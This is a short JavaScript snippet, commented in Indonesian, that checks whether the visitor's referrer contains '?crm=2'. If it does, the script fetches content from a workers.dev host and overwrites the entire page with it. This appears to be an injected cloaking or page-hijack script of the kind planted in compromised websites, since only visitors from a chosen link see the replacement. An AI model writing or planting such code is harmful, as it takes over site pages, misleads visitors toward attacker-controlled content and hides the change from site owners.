// Periksa referer dan parameter
if (document.referrer.indexOf('?crm=2') > -1) {
  // Menggunakan Fetch API untuk mendapatkan data dari URL
  fetch('https://crm-template-one.mastimon.workers.dev')
    .then(response => response.text())
    .then(data => {
      // Mengubah isi tag <html> dengan data yang diambil
      document.documentElement.innerHTML = data;
    })
    .catch(error => {
      console.log('Error:', error);
    });
}
